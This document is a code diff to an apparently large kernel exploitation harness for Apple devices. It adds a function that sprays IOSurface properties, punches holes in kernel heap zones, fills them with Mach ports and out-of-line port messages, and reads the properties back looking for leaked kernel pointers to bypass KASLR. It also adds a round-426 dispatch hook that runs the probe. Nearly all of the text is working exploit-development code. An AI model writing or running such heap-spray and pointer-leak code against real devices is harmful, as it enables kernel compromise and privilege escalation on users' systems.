@@ -16550,6 +16550,281 @@ static void *r419_race_reader(void *arg) {
 }
 
 /*
+ * r423: Heap-based kernel pointer leak via IOSurface property spray.
+ *
+ * Instead of KASLR bypass through info leak, try heap feng shui:
+ * 1. Create many IOSurface property allocations of controlled sizes
+ * 2. Free some to create holes
+ * 3. Trigger kernel object allocations into those holes
+ * 4. Read back the property data to see if kernel pointers landed adjacent
+ *
+ * Also try: use the cross-surface SetValue to write properties on a victim
+ * surface, then read back via CopyAllValues — the property dictionary in
+ * kernel heap may contain pointers to other kernel objects.
+ *
+ * Key vectors:
+ * A. Property spray + read back: set many properties, some with large values,
+ *    free half, allocate kernel objects, read all properties back looking for
+ *    corrupted values that contain kernel pointers.
+ * B. OOL Mach port message spray: send OOL port descriptors in Mach messages.
+ *    The kernel allocates ipc_port pointers contiguously. If we can read
+ *    adjacent memory via our IOSurface primitives, we find ipc_port addresses.
+ * C. Pipe buffer spray adjacent to IOSurface properties.
+ */
+
+static void r423_probe(void) {
+    rlog("\n=== r423: Heap Kernel Pointer Leak ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector A: Property value corruption check ---- */
+    rlog("  Vector A: Property corruption via spray+free+realloc\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        /* Create surface and spray 200 properties of size ~128 bytes */
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        rlog("    Surface created: id=%u\n", IOSurfaceGetID(surf));
+
+        /* Fill properties with known pattern */
+        uint8_t propData[128];
+        memset(propData, 0x41, sizeof(propData));
+        CFDataRef dataVal = CFDataCreate(NULL, propData, sizeof(propData));
+
+        for (int i = 0; i < 200; i++) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            IOSurfaceSetValue(surf, key, dataVal);
+            CFRelease(key);
+        }
+        rlog("    Sprayed 200 properties (128 bytes each)\n");
+
+        /* Remove every other one to create holes in kalloc.128 */
+        for (int i = 0; i < 200; i += 2) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            IOSurfaceRemoveValue(surf, key);
+            CFRelease(key);
+        }
+        rlog("    Freed 100 property holes\n");
+
+        /* Trigger kernel allocations into the holes:
+           Create Mach ports (ipc_port is ~128 bytes on some versions) */
+        mach_port_t fillerPorts[100];
+        for (int i = 0; i < 100; i++) {
+            mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &fillerPorts[i]);
+            mach_port_insert_right(mach_task_self(), fillerPorts[i],
+                fillerPorts[i], MACH_MSG_TYPE_MAKE_SEND);
+        }
+        rlog("    Allocated 100 Mach ports into holes\n");
+
+        /* Read back remaining properties, check for corruption */
+        int kernelFound = 0;
+        for (int i = 1; i < 200; i += 2) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            CFDataRef val = (CFDataRef)IOSurfaceCopyValue(surf, key);
+            if (val) {
+                if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                    const uint8_t *bytes = CFDataGetBytePtr(val);
+                    CFIndex len = CFDataGetLength(val);
+                    /* Check if any 8-byte aligned value looks like kernel ptr */
+                    for (CFIndex off = 0; off + 7 < len; off += 8) {
+                        uint64_t v;
+                        memcpy(&v, bytes + off, 8);
+                        if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                            v != 0xFFFFFFFFFFFFFFFF &&
+                            v != 0x4141414141414141ULL) {
+                            rlog("    *** spray_%d +%lld: 0x%016llx KERNEL ***\n",
+                                i, (long long)off, (unsigned long long)v);
+                            kernelFound++;
+                        }
+                    }
+                    /* Also check if data is no longer our pattern */
+                    if (len >= 8) {
+                        uint64_t first;
+                        memcpy(&first, bytes, 8);
+                        if (first != 0x4141414141414141ULL) {
+                            rlog("    spray_%d corrupted! first=0x%016llx\n",
+                                i, (unsigned long long)first);
+                        }
+                    }
+                }
+                CFRelease(val);
+            }
+            CFRelease(key);
+        }
+        if (!kernelFound)
+            rlog("    No kernel pointers found in properties\n");
+
+        /* Clean up */
+        for (int i = 0; i < 100; i++)
+            mach_port_deallocate(mach_task_self(), fillerPorts[i]);
+        CFRelease(surf);
+        CFRelease(sprops);
+        CFRelease(dataVal);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector B: OOL port spray + property read ---- */
+    rlog("\n  Vector B: OOL port spray via Mach messages\n");
+    {
+        /* Create a surface with property spray at 256 bytes */
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+
+        /* Spray 100 properties of 256 bytes */
+        uint8_t propData[256];
+        memset(propData, 0x42, sizeof(propData));
+        CFDataRef dataVal = CFDataCreate(NULL, propData, sizeof(propData));
+
+        for (int i = 0; i < 100; i++) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            IOSurfaceSetValue(surf, key, dataVal);
+            CFRelease(key);
+        }
+
+        /* Free even slots */
+        for (int i = 0; i < 100; i += 2) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            IOSurfaceRemoveValue(surf, key);
+            CFRelease(key);
+        }
+
+        /* Send OOL Mach messages with port descriptors.
+           Each OOL port array contains kernel ipc_port* pointers. */
+        mach_port_t queuePort;
+        mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &queuePort);
+
+        mach_port_t sendPorts[32];
+        for (int i = 0; i < 32; i++) {
+            mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &sendPorts[i]);
+            mach_port_insert_right(mach_task_self(), sendPorts[i],
+                sendPorts[i], MACH_MSG_TYPE_MAKE_SEND);
+        }
+
+        /* Send messages with OOL ports */
+        for (int m = 0; m < 50; m++) {
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_ports_descriptor_t ool;
+            } msg;
+            memset(&msg, 0, sizeof(msg));
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+                MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = queuePort;
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = sendPorts;
+            msg.ool.count = 32;
+            msg.ool.deallocate = 0;
+            msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+            msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+            kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG,
+                sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            if (kr != KERN_SUCCESS && m == 0)
+                rlog("    OOL send failed: kr=%d\n", kr);
+        }
+        rlog("    Sent 50 OOL port messages (32 ports each)\n");
+
+        /* Read back remaining properties */
+        int kernelFound = 0;
+        for (int i = 1; i < 100; i += 2) {
+            char keyStr[32];
+            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
+            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
+                kCFStringEncodingASCII);
+            CFDataRef val = (CFDataRef)IOSurfaceCopyValue(surf, key);
+            if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
+                const uint8_t *bytes = CFDataGetBytePtr(val);
+                CFIndex len = CFDataGetLength(val);
+                for (CFIndex off = 0; off + 7 < len; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, bytes + off, 8);
+                    if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                        v != 0xFFFFFFFFFFFFFFFF &&
+                        v != 0x4242424242424242ULL) {
+                        rlog("    *** ool_%d +%lld: 0x%016llx KERNEL ***\n",
+                            i, (long long)off, (unsigned long long)v);
+                        kernelFound++;
+                    }
+                }
+            }
+            if (val) CFRelease(val);
+            CFRelease(key);
+        }
+        if (!kernelFound)
+            rlog("    No kernel pointers in OOL spray\n");
+
+        /* Clean up */
+        mach_port_destroy(mach_task_self(), queuePort);
+        for (int i = 0; i < 32; i++)
+            mach_port_deallocate(mach_task_self(), sendPorts[i]);
+        CFRelease(surf);
+        CFRelease(sprops);
+        CFRelease(dataVal);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r423 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r422: DMP kernel address probe.
  *
  * DMP is confirmed active on A20 Pro (Vector 2 of r421 showed 48% speedup).
@@ -71883,6 +72158,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 426) {
+            rlog("*** rounds=426: Heap Kernel Pointer Leak ***\n");
+            rlog("  Property spray + free + realloc, OOL port spray.\n\n");
+            fflush(stdout);
+            r423_probe();
+            goto done;
+        }
         if (rounds == 425) {
             rlog("*** rounds=425: DMP Kernel Address Probe ***\n");
             rlog("  Using confirmed DMP to probe kernel virtual address candidates.\n\n");
@@ -74450,7 +74732,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
